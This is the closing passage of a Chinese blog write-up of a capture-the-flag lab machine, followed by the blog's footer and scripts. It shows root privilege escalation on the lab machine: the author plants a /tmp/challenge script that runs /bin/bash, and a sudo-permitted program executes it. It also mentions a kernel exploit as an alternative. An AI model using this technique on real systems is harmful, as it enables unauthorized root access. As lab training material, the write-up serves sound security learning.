+saket@ubuntu:/$ sudo ./home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
+saket@ubuntu:/$ 
+</code></pre>
+<p>报错没找到文件，那就自己写一个。</p>
+<pre class="notranslate"><code class="notranslate">saket@ubuntu:/tmp$ cd /tmp
+saket@ubuntu:/tmp$ echo '#!/bin/bash' &gt;challenge
+saket@ubuntu:/tmp$ echo '/bin/bash' &gt;&gt;challenge
+saket@ubuntu:/tmp$ chmod +x challenge
+saket@ubuntu:/tmp$ sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+root@ubuntu:/tmp# 
+</code></pre>
+<p>提权成功</p>
+<h2>反思</h2>
+<p>这个靶机有点意思，学到了很多，包括许多字符处理工具。虽然每走一步都有提示的，但是也有难度，看wp的时候发现还有别的路子，有内核漏洞也可以提权，都不用横向移动。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://dehua-rd.github.io">dehua</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","dehua-rd/dehua-rd.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
